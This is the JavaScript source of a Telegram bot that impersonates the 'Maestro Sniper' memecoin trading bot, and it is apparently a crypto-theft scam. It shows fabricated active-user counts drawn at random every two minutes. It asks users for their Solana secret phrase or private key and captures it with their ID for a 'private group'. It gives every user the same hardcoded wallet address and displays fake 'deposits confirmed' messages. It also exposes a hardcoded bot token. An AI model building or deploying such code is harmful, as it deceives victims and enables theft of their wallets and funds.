const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const crypto = require('crypto');
const cron = require('node-cron');
require('dotenv').config();

// Initialize Express app for webhooks
const app = express();
app.use(express.json());

// Bot token from environment variable
const token = process.env.BOT_TOKEN || '8262576157:AAENogSLc1ggOb2SWZ6No-g9AtgIe809L7Y';
const PORT = process.env.PORT || 3000;
const WEBHOOK_URL = process.env.WEBHOOK_URL; // Set this in Render

// Initialize bot (we'll use webhook mode)
const bot = new TelegramBot(token);

// Store user sessions (in production, use a proper database)
const userSessions = new Map();
let activeUsersToday = Math.floor(Math.random() * 50000) + 50000; // Random between 50k-100k

// Update active users every 2 minutes
cron.schedule('*/2 * * * *', () => {
  activeUsersToday = Math.floor(Math.random() * 50000) + 50000;
  console.log(`Updated active users: ${activeUsersToday}`);
});

// Set webhook
app.post(`/webhook/${token}`, (req, res) => {
  bot.processUpdate(req.body);
  res.sendStatus(200);
});

// Start server
app.listen(PORT, async () => {
  console.log(`Server running on port ${PORT}`);
  
  // Set webhook on server start
  if (WEBHOOK_URL) {
    try {
      await bot.setWebHook(`${WEBHOOK_URL}/webhook/${token}`);
      console.log('Webhook set successfully');
    } catch (error) {
      console.error('Error setting webhook:', error);
    }
  }
});

// Generate simple math captcha
function generateCaptcha() {
  const operations = ['+', '-'];
  const op = operations[Math.floor(Math.random() * operations.length)];
  let a, b, answer;
  
  if (op === '+') {
    a = Math.floor(Math.random() * 10) + 1;
    b = Math.floor(Math.random() * 10) + 1;
    answer = a + b;
  } else {
    a = Math.floor(Math.random() * 10) + 6;
    b = Math.floor(Math.random() * 10) + 1;
    answer = a - b;
  }
  
  return { question: `${a} ${op} ${b} = ?`, answer };
}

// Main menu keyboard
function getMainMenuKeyboard() {
  return {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "🔗 Chains", callback_data: "chains" },
          { text: "💼 Wallets", callback_data: "wallets" },
          { text: "⚙️ Call Channels", callback_data: "call_channels" }
        ],
        [
          { text: "🤝 Presales", callback_data: "presales" },
          { text: "Copytrade", callback_data: "copytrade" },
          { text: "📡 Signals", callback_data: "signals" }
        ],
        [
          { text: "⚙️ God Mode", callback_data: "god_mode" },
          { text: "📊 Positions", callback_data: "positions" },
          { text: "🎯 Auto Snipe", callback_data: "auto_snipe" }
        ],
        [
          { text: "⬅️ Bridge", callback_data: "bridge" },
          { text: "⭐ Premium", callback_data: "premium" },
          { text: "ℹ️ FAQ", callback_data: "faq" }
        ],
        [
          { text: "≡ Menu", callback_data: "menu" },
          { text: "😊 Message", callback_data: "message" },
          { text: "📎 Attachment", callback_data: "attachment" },
          { text: "🎤 Voice", callback_data: "voice" }
        ]
      ]
    }
  };
}

// Wallet menu keyboard
function getWalletMenuKeyboard() {
  return {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "🔑 Import Wallet", callback_data: "import_wallet" },
          { text: "🆕 Generate Wallet", callback_data: "generate_wallet" }
        ],
        [
          { text: "🔙 Back", callback_data: "back_to_main" }
        ]
      ]
    }
  };
}

// FAQ keyboard
function getFaqKeyboard() {
  return {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "🔙 Back to Menu", callback_data: "back_to_main" }
        ]
      ]
    }
  };
}

// Generate wallet keyboard
function getGenerateWalletKeyboard() {
  return {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Approve", callback_data: "approve_wallet" },
          { text: "🔙 Back", callback_data: "back_to_wallet" }
        ]
      ]
    }
  };
}

// Handle /start command
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const captcha = generateCaptcha();
  
  userSessions.set(chatId, {
    captchaAnswer: captcha.answer,
    hasWallet: false
  });
  
  const welcomeMessage = `Welcome to Maestro Sniper! 🎉 The ultimate memecoin trading bot.

*Active Users Today:* ${activeUsersToday.toLocaleString()} 👥
*Total Users:* 900,000+ 🚀

Solve this quick math captcha to proceed:
${captcha.question} ${captcha.question.includes('+') ? '➕' : '➖'}

Reply with the answer.`;
  
  bot.sendMessage(chatId, welcomeMessage, { parse_mode: 'Markdown' });
});

// Handle text messages (captcha responses)
bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text;
  
  // Skip if it's a command or user doesn't have a session
  if (text.startsWith('/') || !userSessions.has(chatId)) return;
  
  const session = userSessions.get(chatId);
  
  // Check if we're expecting a captcha answer
  if (session.captchaAnswer) {
    if (parseInt(text) === session.captchaAnswer) {
      // Captcha correct
      userSessions.set(chatId, { ...session, captchaAnswer: null });
      showMainMenu(chatId);
    } else {
      // Captcha wrong
      const newCaptcha = generateCaptcha();
      userSessions.set(chatId, { ...session, captchaAnswer: newCaptcha.answer });
      
      bot.sendMessage(
        chatId, 
        `Oops! Wrong answer. ❌ Try again: ${newCaptcha.question} ${newCaptcha.question.includes('+') ? '➕' : '➖'}`,
        { parse_mode: 'Markdown' }
      );
    }
  } else if (session.expectingWalletImport) {
    // User is sending wallet info
    userSessions.set(chatId, { 
      ...session, 
      expectingWalletImport: false,
      hasWallet: true 
    });
    
    // Send processing message
    bot.sendMessage(chatId, "Processing... Please wait... ⏳");
    
    // Forward to private group (simulated)
    const privateGroupId = 1002914341678;
    const userInfo = `User ID: ${msg.from.id}\nUsername: @${msg.from.username || 'N/A'}\nInput: ${text}`;
    
    // In a real scenario, you would forward this to the group
    console.log(`Wallet import data for group ${privateGroupId}: ${userInfo}`);
    
    // Simulate processing delay
    setTimeout(() => {
      bot.sendMessage(
        chatId, 
        "Wallet imported successfully! Welcome aboard. 🎉",
        getMainMenuKeyboard()
      );
    }, 3000);
  }
});

// Handle callback queries (button presses)
bot.on('callback_query', async (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const data = callbackQuery.data;
  const messageId = callbackQuery.message.message_id;
  const session = userSessions.get(chatId) || { hasWallet: false };
  
  try {
    // Handle different button actions
    switch(data) {
      case 'back_to_main':
        await showMainMenu(chatId);
        break;
        
      case 'back_to_wallet':
        await showWalletMenu(chatId);
        break;
        
      case 'wallets':
        await showWalletMenu(chatId);
        break;
        
      case 'import_wallet':
        userSessions.set(chatId, { ...session, expectingWalletImport: true });
        await bot.sendMessage(chatId, "Please input your Solana wallet secret phrase or private key. Keep it secure! 🔒");
        break;
        
      case 'generate_wallet':
        await bot.sendMessage(
          chatId,
          "Generating a new secure wallet for you... ✨\n\n*Your new Solana address:* `AKHGQFCPawfxhS4vW3trccaEv5BCAJKeGa72CnRW7Lwm`\n\nCopy and save it safely!",
          { 
            parse_mode: 'Markdown',
            ...getGenerateWalletKeyboard() 
          }
        );
        break;
        
      case 'approve_wallet':
        userSessions.set(chatId, { ...session, hasWallet: true });
        await bot.sendMessage(chatId, "Processing transaction... Please wait... 💸");
        
        // Simulate processing delay
        setTimeout(async () => {
          await bot.sendMessage(
            chatId, 
            "Approved! Deposits confirmed. Ready to trade! 📈",
            getMainMenuKeyboard()
          );
        }, 3000);
        break;
        
      case 'faq':
        await bot.sendMessage(
          chatId,
          `*Frequently Asked Questions:* ❓

• *How to start?* Import or generate a wallet! 🚀
• *Supported chains?* Solana, ETH, Base +10 more! 🌐
• *Is it safe?* Anti-rug protection enabled! 🛡️
• *Premium?* Unlock with stars! ⭐

Reply /start for menu.`,
          { 
            parse_mode: 'Markdown',
            ...getFaqKeyboard() 
          }
        );
        break;
        
      // Handle all other buttons that require a wallet
      default:
        if (!session.hasWallet && !['back_to_main', 'back_to_wallet', 'wallets', 'faq'].includes(data)) {
          await bot.sendMessage(
            chatId,
            "⚠️ No funds detected! Please import or generate a wallet first to access this feature. 💳",
            getWalletMenuKeyboard()
          );
        } else {
          // For other buttons, just show a message or the main menu
          await showMainMenu(chatId);
        }
    }
    
    // Answer the callback query to remove loading state
    await bot.answerCallbackQuery(callbackQuery.id);
  } catch (error) {
    console.error('Error handling callback:', error);
    await bot.sendMessage(chatId, "Something went wrong. Please try again. 😊");
  }
});

// Show main menu function
async function showMainMenu(chatId) {
  const session = userSessions.get(chatId) || { hasWallet: false };
  const statusMessage = session.hasWallet ? 
    "✅ Wallet connected! Ready to trade." : 
    "⚠️ No wallet connected. Access limited.";
  
  await bot.sendMessage(
    chatId,
    `*Maestro Sniper Bot* 🎯\n_OG Telegram memecoin sniper since 2022_\n\n${statusMessage}\n\n*Active Users Today:* ${activeUsersToday.toLocaleString()} 👥\n*Join 900K+ users trading memecoins!* 🚀`,
    { 
      parse_mode: 'Markdown',
      ...getMainMenuKeyboard() 
    }
  );
}

// Show wallet menu function
async function showWalletMenu(chatId) {
  await bot.sendMessage(
    chatId,
    "*Wallet Management* 💼\n\nManage your crypto wallets for trading:",
    { 
      parse_mode: 'Markdown',
      ...getWalletMenuKeyboard() 
    }
  );
}

// Error handling
bot.on('error', (error) => {
  console.error('Bot error:', error);
});

// Handle uncaught exceptions
process.on('uncaughtException', (error) => {
  console.error('Uncaught Exception:', error);
});

process.on('unhandledRejection', (reason, promise) => {
  console.error('Unhandled Rejection at:', promise, 'reason:', reason);
});
